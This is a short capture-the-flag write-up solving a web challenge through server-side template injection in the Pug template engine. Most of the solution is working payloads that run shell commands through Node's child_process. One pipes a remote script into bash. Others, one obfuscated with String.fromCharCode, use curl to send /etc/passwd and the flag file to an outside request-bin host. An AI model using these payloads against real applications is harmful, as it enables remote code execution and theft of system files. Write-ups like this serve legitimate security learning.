# CTF Name – Defeat the Pug!

- **Category:** category
- **Points:** points

## Challenge

> The Pug is not only a companion of Chinese Emperors, the mascot of Holland's royal House of Orange, but also an expert at developing web applications! But the Pug has a fatal flaw that he does not realise yet, can you retrieve the "flag.txt" file in the "/" directory to win?

## Solution

No reflected xss

Try template injections:

```
${7*3}
<%= 7*3 %>
{{7*3}}
#{7*7}
```

#{7*3} rendered nothing - possible target

## Encode # gives result
Example https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#pugjs-nodejs

```
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}

#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}
```

## Exfil /etc/passwd to your server

`%23{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115)).exec('curl -F file=@/etc/passwd https://en6sb71obktq2.x.pipedream.net')}()}`

## Exfil the flag

`http://pugster.seekurity.com.au:8000/search?id=%23{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115)).exec('curl -F file=@/flag.txt https://en6sb71obktq2.x.pipedream.net')}()`


```
flag{awww-the-pug-has-been-defeated-sad-puppy}
```
